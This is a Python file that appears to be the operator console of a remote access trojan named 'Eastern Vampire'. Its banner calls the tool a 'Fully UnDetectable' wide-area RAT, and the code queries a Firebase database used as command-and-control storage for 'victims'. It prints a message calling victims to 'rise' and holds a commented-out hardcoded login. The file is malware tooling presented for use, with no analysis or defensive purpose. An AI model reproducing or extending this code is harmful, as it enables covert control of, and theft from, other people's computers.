from os import system
from getpass import getpass
from requests import post, get, patch

database = "https://wanz-6124a-default-rtdb.firebaseio.com/eastern-vampire.json"
wakeup_call = "https://wanz-6124a-default-rtdb.firebaseio.com/eastern-vampire/victims/wakeup-call.json"

system('cls')
banner = '''
    ______           __                     _    __                      _         
   / ____/___ ______/ /____  _________     | |  / /___ _____ ___  ____  (_)_________ 
  / __/ / __ `/ ___/ __/ _ \/ ___/ __ \    | | / / __ `/ __ `__ \/ __ \/ / ___/ _  /
 / /___/ /_/ (__  ) /_/  __/ /  / / / /    | |/ / /_/ / / / / / / /_/ / / /  /  __/
/_____/\__,_/____/\__/\___/_/  /_/ /_/     |___/\__,_/_/ /_/ /_/ .___/_/_/   \___/ 
                                                              /_/ 
                                                                 v2022.0
                                                                 
            [ * ] Advance Wide Area Network RAT 
            [ * ] FUD (Fully UnDetectable)
            [ * ] Developed by WanZ 
            [ ! ] Do not use this tool without permission from the developer
                          
'''
print(banner)

# username = input("Username >> ")
# password = getpass("Password >> ")

# if (username != "wanz" and password != "wan hensem pujan gadis"):
#     exit()

system('cls')
print(banner)

print("[ ? ] calling all victims to rise . . .")

data = get(database).json()

print(data['victims']['wakeup-call'])

    